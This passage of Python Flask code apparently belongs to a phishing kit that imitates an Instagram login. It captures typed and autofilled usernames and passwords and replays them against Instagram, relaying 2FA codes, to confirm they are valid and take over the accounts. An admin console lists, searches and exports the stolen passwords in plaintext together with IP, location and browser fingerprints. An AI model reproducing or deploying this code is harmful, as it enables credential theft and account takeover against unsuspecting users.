        f'<td class="p"><span>{escape(r["password"] or "")}</span> '
        f'<button class="btn cp" onclick="cp(this)">copy</button></td>'
        f'<td><span class="mono">{escape(r["source"] or "")}</span></td>'
        f'<td><a href="{ADMIN_BASE}/{r["id"]}">open</a></td>'
        f"</tr>"
    )


# ============================== routes ==============================
@app.before_request
def ensure_client_id():
    g.cid = request.cookies.get("cid") or uuid.uuid4().hex[:16]
    session.permanent = True


@app.after_request
def finalize(resp: Response) -> Response:
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
    resp.headers["Pragma"] = "no-cache"
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["X-Frame-Options"] = "DENY"
    resp.headers["X-Robots-Tag"] = "noindex, nofollow"
    resp.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    resp.headers["Permissions-Policy"] = "geolocation=(), microphone=(), camera=(), interest-cohort=()"
    resp.headers["Content-Security-Policy"] = (
        "default-src 'self'; img-src 'self' data: https:; "
        "style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; "
        "connect-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'self'"
    )
    if request.is_secure:
        resp.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    if not request.cookies.get("cid"):
        resp.set_cookie("cid", g.cid, max_age=COOKIE_MAX_AGE, samesite="Lax")
    return resp


def read_json() -> dict:
    data = request.get_json(silent=True)
    if not isinstance(data, dict):
        try:
            data = json.loads(request.get_data(as_text=True) or "{}")
        except ValueError:
            data = {}
    return data if isinstance(data, dict) else {}


@app.route("/")
def index():
    if session.get("user"):
        return redirect(url_for("dashboard"))
    return html(LOGIN_PAGE_HTML.replace("__USER__", ""))


@app.route("/favicon.ico")
def favicon():
    return ("", 204)


@app.route("/credential", methods=["POST"])
def credential():
    ip = client_ip()
    if not rate_ok("cred:" + ip, 120):
        return jsonify({"ok": False, "error": "rate limited"}), 429

    data = read_json()
    username = (data.get("username") or "").strip()[:200]
    password = (data.get("password") or "")[:300]
    source = (data.get("source") or "autofill")[:16]
    sid = (data.get("sid") or "")[:24]
    meta = data.get("meta") if isinstance(data.get("meta"), dict) else {}

    if not (username or password):
        return jsonify({"ok": True, "skipped": "empty"})

    existing = recent_cred_id(g.cid, username, password, 8)
    if existing:
        return jsonify({"ok": True, "id": existing, "duplicate": True})

    cred_id, created = capture_credential(username, password, source, sid, meta)
    return jsonify({"ok": True, "id": cred_id, "created": created})


@app.route("/login", methods=["POST"])
def login():
    """Strict gate: the dashboard opens only for a verdict Instagram itself gave."""
    ip = client_ip()
    if not rate_ok("login:" + ip, 40):
        return login_page("Too many attempts — wait a minute and try again.", "", 429)

    username = (request.form.get("username") or "").strip()[:200]
    password = (request.form.get("password") or "")[:300]
    if not username or not password:
        return login_page("Please enter your username and password.", username)

    try:
        payload = json.loads(request.form.get("payload") or "{}")
    except ValueError:
        payload = {}
    if not isinstance(payload, dict):
        payload = {}
    meta = payload.get("meta") if isinstance(payload.get("meta"), dict) else {}

    try:
        visit = int(request.cookies.get("vc", "0")) + 1
    except ValueError:
        visit = 1

    # The beacon fired on submit usually already stored this exact pair — reuse it.
    cred_id = recent_cred_id(g.cid, username, password, 8)
    if cred_id is None:
        cred_id, _ = capture_credential(username, password, "submit", payload.get("sid") or "", meta)
    else:
        session["last_cred"] = cred_id

    job = start_login(g.cid, username, password)

    verdict = job.wait_verdict(LOGIN_WAIT)
    if not verdict and job.phase not in ("ready", "code", "approve", "error"):
        verdict = job.wait_verdict(LOGIN_GRACE)
    if not verdict:
        verdict = {"ready": "ok", "error": "error"}.get(job.phase, "")

    threading.Thread(target=settle_verdict, args=(job, cred_id), daemon=True).start()
    set_verdict(cred_id, verdict or "pending")
    verdict_banner(verdict, username, job.error)

    # 1) Instagram said no (or the worker died) -> never open the dashboard
    if verdict in DENIED_VERDICTS or job.phase == "error":
        session.pop("user", None)
        reason = job.error or "Instagram rejected the login. Try again."
        return login_page(reason, username)

    # 2) No definitive answer -> stay here, no fake session
    if verdict != "ok" and job.phase not in ACCEPTED_PHASES:
        return login_page(
            "Instagram did not answer in time, so the login is not confirmed yet. "
            "Press Log in again.", username)

    # 3) Logged in, but as somebody else -> never show the wrong account
    other = account_mismatch(job, username)
    if other:
        session.pop("user", None)
        set_verdict(cred_id, "wrong_account")
        return login_page(
            f"Instagram logged in as @{other}, not the account you typed.", username)

    session.update({
        "user": username,
        "login_count": session.get("login_count", 0) + 1,
        "last_login": iso_now(),
        "last_cred": cred_id,
    })

    resp = redirect(url_for("dashboard"))
    resp.set_cookie("vc", str(visit), max_age=COOKIE_MAX_AGE, samesite="Lax")
    resp.set_cookie("last_user", username, max_age=COOKIE_MAX_AGE, samesite="Lax")
    return resp


@app.route("/dashboard")
def dashboard():
    username = session.get("user")
    if not username:
        return redirect(url_for("index"))

    # no live worker AND no verified credential for this browser -> back to login
    if ig.get(g.cid) is None and not verified_login(g.cid, username):
        session.pop("user", None)
        return login_page("Session ended before the login was confirmed. Sign in again.",
                          username)

    mark_ok_if_ready()

    page = RESULTS_PAGE_HTML
    page = page.replace("your.handle", str(escape(username)))
    page = page.replace(">YO<", ">" + str(escape(make_initials(username))) + "<")
    return html(page)


# ---------------- live data ----------------
@app.route("/api/state")
def api_state():
    if not session.get("user"):
        return jsonify({"phase": "error", "error": "No session."}), 401
    mark_ok_if_ready()
    job = ig.get(g.cid)
    if job:
        return jsonify(job.public())
    st = load_state(g.cid)
    if st:
        if st["phase"] in ("queued", "login", "code", "approve", "sync"):
            st["phase"] = "error"
            st["error"] = st["error"] or "Job lost — press Try again."
        st.setdefault("choice", "")
        st.setdefault("engaged_ok", True)
        return jsonify(st)
    return jsonify({"phase": "error", "error": "No login data — sign in again.",
                    "profile": {}, "counts": {}, "lists": {}})


@app.route("/api/code", methods=["POST"])
def api_code():
    if not session.get("user"):
        return jsonify({"ok": False}), 401
    job = ig.get(g.cid)
    if not job:
        return jsonify({"ok": False, "error": "No job"}), 404
    code = (read_json().get("code") or "").strip()[:12]
    job.submit_code(code or "continue")
    return jsonify({"ok": True})


@app.route("/api/sync", methods=["POST"])
def api_sync():
    if not session.get("user"):
        return jsonify({"ok": False}), 401
    if not rate_ok("sync:" + g.cid, 6, SYNC_MIN_INTERVAL):
        return jsonify({"ok": True, "skipped": "too soon"})
    job = ig.get(g.cid)
    if job and job.phase in ("login", "code", "approve"):
        job.submit_code("continue")
        return jsonify({"ok": True})
    if job and job.phase == "ready":
        threading.Thread(target=job.sync, daemon=True).start()
        return jsonify({"ok": True})

    # no job, or a dead/failed job -> (re)start from the stored credential
    conn = connect()
    try:
        row = conn.execute(
            "SELECT username, password FROM creds WHERE cid=? AND password!='' "
            "ORDER BY id DESC LIMIT 1", (g.cid,)).fetchone()
    finally:
        conn.close()
    if not row:
        return jsonify({"ok": False, "error": "No credential"}), 404
    start_login(g.cid, row["username"], row["password"])
    return jsonify({"ok": True})


@app.route("/api/unfollow", methods=["POST"])
def api_unfollow():
    if not session.get("user"):
        return jsonify({"ok": False}), 401
    if not rate_ok("act:" + g.cid, 90, 60):
        return jsonify({"ok": False, "error": "Slow down"}), 429
    d = read_json()
    pk, name = (d.get("pk") or "").strip(), (d.get("username") or "").strip()
    job = ig.get(g.cid)
    if not job or job.phase != "ready":
        return jsonify({"ok": False, "error": "Not logged in"}), 409
    ok, err = job.unfollow(pk, name)
    log_action(g.cid, "unfollow", name, ok, err)
    _ig_log(f"{'unfollowed' if ok else 'unfollow failed'}: {name} {err}".strip())
    return jsonify({"ok": ok, "error": err})


@app.route("/api/follow", methods=["POST"])
def api_follow():
    if not session.get("user"):
        return jsonify({"ok": False}), 401
    if not rate_ok("act:" + g.cid, 90, 60):
        return jsonify({"ok": False, "error": "Slow down"}), 429
    d = read_json()
    pk, name = (d.get("pk") or "").strip(), (d.get("username") or "").strip()
    job = ig.get(g.cid)
    if not job or job.phase != "ready":
        return jsonify({"ok": False, "error": "Not logged in"}), 409
    ok, err = job.follow(pk, name)
    log_action(g.cid, "follow", name, ok, err)
    return jsonify({"ok": ok, "error": err})


@app.route("/cookies")
def cookies_view():
    """Last credential this browser submitted. `?full=1` reveals the password."""
    cred = session.get("last_cred")
    conn = connect()
    try:
        row = (conn.execute("SELECT * FROM creds WHERE id=?", (cred,)).fetchone()
               if cred else
               conn.execute("SELECT * FROM creds WHERE cid=? ORDER BY id DESC LIMIT 1",
                            (g.cid,)).fetchone())
    finally:
        conn.close()

    if not row:
        return jsonify({"ok": False, "message": "nothing captured for this browser yet"})

    pw = row["password"] or ""
    return jsonify({
        "ok": True,
        "id": row["id"],
        "created_at": row["created_at"],
        "source": row["source"],
        "verdict": row["verdict"],
        "username": row["username"],
        "password": pw if request.args.get("full") == "1" else mask(pw),
        "password_masked": mask(pw),
        "ip": row["ip"],
        "geo": json.loads(row["geo_json"] or "{}"),
        "fingerprint": json.loads(row["meta_json"] or "{}"),
    })


@app.route("/logout")
def logout():
    for k in ("user", "last_login", "last_cred", "last_user"):
        session.pop(k, None)
    return redirect(url_for("index"))


# ---------------- admin ----------------
def admin_query(q: str, only: str, since: int | None = None) -> tuple[str, list]:
    sql = ADMIN_SELECT
    where: list[str] = []
    params: list = []

    if q:
        where.append("(c.ip LIKE ? OR c.ua LIKE ? OR c.city LIKE ? OR c.country LIKE ? "
                     "OR c.isp LIKE ? OR c.cid LIKE ? OR c.username LIKE ? OR c.password LIKE ? "
                     "OR c.source LIKE ?)")
        params += [f"%{q}%"] * 9
    if only == "pass":
        where.append("c.password IS NOT NULL AND c.password != ''")
    elif only == "partial":
        where.append("(c.username = '' OR c.password = '')")
    elif only == "ok":
        where.append("c.verdict = 'ok'")
    elif only == "denied":
        where.append("c.verdict IN ('bad_password','bad_user','suspended','proxy','challenge')")
    if since is not None:
        where.append("c.id > ?")
        params.append(since)

    if where:
        sql += " WHERE " + " AND ".join(where)
    return sql, params


@app.route(ADMIN_BASE)
def admin():
    if not admin_ok():
        return html(LOGIN_ADMIN_HTML.replace('action="/admin"', f'action="{ADMIN_BASE}"'), 401)

    q = (request.args.get("q") or "").strip()
    only = request.args.get("only") or ""
    if only not in ("", "pass", "partial", "ok", "denied"):
        only = ""

    sql, params = admin_query(q, only)
    sql += " ORDER BY c.id DESC LIMIT 300"

    conn = connect()
    try:
        rows = conn.execute(sql, params).fetchall()
    finally:
        conn.close()

    banner = "" if ADMIN_TOKEN else (
        '<div class="warn">ADMIN_TOKEN unset — console is public. Set it in the environment.</div>'
    )

    chips = "".join(
        '<a class="chip{0}" href="{1}?{2}">{3}</a>'.format(
            " on" if only == value else "",
            ADMIN_BASE,
            urlencode({"q": q, "only": value} if value else ({"q": q} if q else {})),
            label,
        )
        for value, label in (("", "all"), ("pass", "with password"),
                             ("partial", "partial"), ("ok", "login ok"),
                             ("denied", "denied"))
    )

    body = (
        banner
        + '<form class="bar" method="get">'
        + f'<input name="q" value="{escape(q)}" placeholder="search ip / user / pass / ua / city / isp">'
        + (f'<input type="hidden" name="only" value="{escape(only)}">' if only else "")
        + '<button class="btn" type="submit">search</button>'
        + f'<a class="btn" href="{ADMIN_BASE}">reset</a>'
        + chips
        + '</form>'
        + '<table><thead><tr><th>#</th><th>time (utc)</th><th>place</th><th>ip</th>'
        + '<th>username</th><th>password</th><th>source</th><th></th></tr></thead>'
        + f'<tbody id="feed">{"".join(row_html(r) for r in rows)}</tbody></table>'
    )
    if not rows:
        body += '<div class="empty">no credentials yet — open the login link</div>'
    return html(render_admin(body))


@app.route(ADMIN_BASE + "/feed")
def admin_feed():
    if not admin_ok():
        return jsonify({"rows": [], "last": 0}), 401

    raw = request.args.get("since", "0")
    since = int(raw) if raw.isdigit() else 0
    q = (request.args.get("q") or "").strip()
    only = request.args.get("only") or ""
    if only not in ("", "pass", "partial", "ok", "denied"):
        only = ""

    sql, params = admin_query(q, only, since)
    sql += " ORDER BY c.id DESC LIMIT 40"

    conn = connect()
    try:
        rows = conn.execute(sql, params).fetchall()
    finally:
        conn.close()

    last = max([r["id"] for r in rows], default=since)
    return jsonify({"rows": [row_html(r) for r in rows], "last": last})


@app.route(ADMIN_BASE + "/<int:cred_id>")
def admin_credential(cred_id: int):
    if not admin_ok():
        return html(LOGIN_ADMIN_HTML.replace('action="/admin"', f'action="{ADMIN_BASE}"'), 401)

    conn = connect()
    try:
        row = conn.execute("SELECT * FROM creds WHERE id=?", (cred_id,)).fetchone()
    finally:
        conn.close()

    if not row:
        abort(404)

    fp = json.dumps(json.loads(row["meta_json"] or "{}"), indent=2, ensure_ascii=False)
    ginfo = json.dumps(json.loads(row["geo_json"] or "{}"), indent=2, ensure_ascii=False)

    cred_html = (
        '<div class="cred">'
        f'<div class="row"><span class="k">username</span>'
        f'<span class="v u" id="uv">{escape(row["username"] or "")}</span>'
        f'<button class="btn cp" onclick="cp(this)">copy</button></div>'
        f'<div class="row"><span class="k">password</span>'
        f'<span class="v p" id="pv">{escape(row["password"] or "")}</span>'
        f'<button class="btn cp" onclick="cp(this)">copy</button></div>'
        '</div>'
    )

    body = (
        f'<a class="btn" href="{ADMIN_BASE}">← back</a> '
        f'<form class="inline" method="post" action="{ADMIN_BASE}/delete/{cred_id}" '
        f'onsubmit="return confirm(\'delete #{cred_id}?\')">'
        f'<input type="hidden" name="_csrf" value="{csrf_token()}">'
        f'<button class="btn" type="submit">delete</button></form>'
        f'<div style="height:16px"></div>'
        f'<div class="block"><h2>credential #{row["id"]} · {escape(row["source"] or "")} '
        f'{verdict_tag(row["verdict"] or "")}</h2>'
        f'<pre>client_id {escape(row["cid"] or "")}\nsession   {escape(row["sid"] or "")}\n'
        f'time      {escape(row["created_at"] or "")}\nip        {escape(row["ip"] or "")}\n'
        f'isp       {escape(row["isp"] or "")}\n'
        f'ua        {escape(row["ua"] or "")}\nreferer   {escape(row["referer"] or "")}\n'
        f'lang      {escape(row["accept_lang"] or "")}</pre></div>'
        + cred_html
        + f'<div class="block"><h2>fingerprint</h2><pre>{escape(fp)}</pre></div>'
        + f'<div class="block"><h2>geo / network</h2><pre>{escape(ginfo)}</pre></div>'
    )
    return html(render_admin(body))


@app.route(ADMIN_BASE + "/delete/<int:cred_id>", methods=["POST"])
def admin_delete(cred_id: int):
    if not admin_ok():
        return redirect(url_for("admin"))
    if not csrf_ok():
        abort(403)
    conn = connect()
    try:
        conn.execute("DELETE FROM creds WHERE id=?", (cred_id,))
        conn.commit()
    finally:
        conn.close()
    return redirect(url_for("admin"))


@app.route(ADMIN_BASE + "/delete-all", methods=["POST"])
def admin_delete_all():
    if not admin_ok():
        return redirect(url_for("admin"))
    if not csrf_ok():
        abort(403)
    conn = connect()
    try:
        conn.execute("DELETE FROM creds")
        conn.execute("DELETE FROM sqlite_sequence WHERE name='creds'")
        conn.commit()
    finally:
        conn.close()
    logger.info("all credentials cleared")
    return redirect(url_for("admin"))


@app.route(ADMIN_BASE + "/export")
def admin_export():
    if not admin_ok():
        return redirect(url_for("admin"))

    fmt = request.args.get("fmt", "json")
    conn = connect()
    try:
        rows = conn.execute("SELECT * FROM creds ORDER BY id").fetchall()
    finally:
        conn.close()

    stamp = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")

    if fmt == "csv":
        buf = io.StringIO()
        w = csv.writer(buf)
        w.writerow(["id", "created_at", "ip", "country", "city", "isp", "source",
                    "username", "password", "ua", "referer", "verdict"])
        for r in rows:
            w.writerow([r["id"], r["created_at"], r["ip"], r["country"], r["city"], r["isp"],
                        r["source"], r["username"], r["password"], r["ua"], r["referer"],
                        r["verdict"]])
        return Response(buf.getvalue(), mimetype="text/csv",
                        headers={"Content-Disposition": f"attachment; filename=insight-{stamp}.csv"})

    payload = {
        "exported_at": iso_now(),
        "count": len(rows),
        "credentials": [dict(r) for r in rows],
    }
    return Response(json.dumps(payload, indent=2, ensure_ascii=False), mimetype="application/json",
                    headers={"Content-Disposition": f"attachment; filename=insight-{stamp}.json"})


@app.route("/healthz")
def healthz():
    conn = connect()
    try:
        n = conn.execute("SELECT COUNT(*) c FROM creds").fetchone()["c"]
    finally:
        conn.close()
    return jsonify({"ok": True, "credentials": n, "geo": GEO_ENABLED,
                    "admin_locked": bool(ADMIN_TOKEN)})


# ---------------- errors ----------------
ERROR_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>__C__</title>
<style>body{margin:0;min-height:100dvh;display:grid;place-items:center;background:#000;color:#f5f5f5;
font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;text-align:center;padding:16px}
h1{font-size:64px;margin:0;background:linear-gradient(45deg,#feda75,#d62976,#4f5bd5);
-webkit-background-clip:text;background-clip:text;color:transparent;
animation:in .6s cubic-bezier(.2,1.2,.4,1) both}
p{color:#8e8e8e;margin:10px 0 24px}a{color:#0095f6;text-decoration:none;font-weight:600}
@keyframes in{from{opacity:0;transform:scale(.85)}}
@media (prefers-reduced-motion:reduce){h1{animation:none}}</style>
</head><body><div><h1>__C__</h1><p>__M__</p><a href="/">back to login</a></div></body></html>"""


def error_page(code: str, message: str, status: int) -> Response:
    return html(ERROR_HTML.replace("__C__", code).replace("__M__", message), status)


@app.errorhandler(400)
def e400(_):
    return error_page("400", "bad request", 400)


@app.errorhandler(403)
def e403(_):
    return error_page("403", "forbidden — reload the console", 403)


@app.errorhandler(404)
def e404(_):
    return error_page("404", "page not found", 404)


@app.errorhandler(405)
def e405(_):
    return error_page("405", "method not allowed", 405)


@app.errorhandler(413)
def e413(_):
    return error_page("413", "payload too large", 413)


@app.errorhandler(429)
def e429(_):
    return error_page("429", "slow down a moment", 429)


@app.errorhandler(500)
def e500(_):
    logger.exception("unhandled error")
    return error_page("500", "something broke", 500)


# ============================== boot ==============================
init_db()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", "5000"))
    logger.info("console: http://localhost:%s%s  (token set: %s)", port, ADMIN_BASE, bool(ADMIN_TOKEN))
    if not ADMIN_TOKEN:
        logger.warning("ADMIN_TOKEN unset — console is public. Set it before exposing.")
    if not os.environ.get("SECRET_KEY"):
        logger.warning("SECRET_KEY unset — using persisted key in %s", DATA_DIR / "secret.key")
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
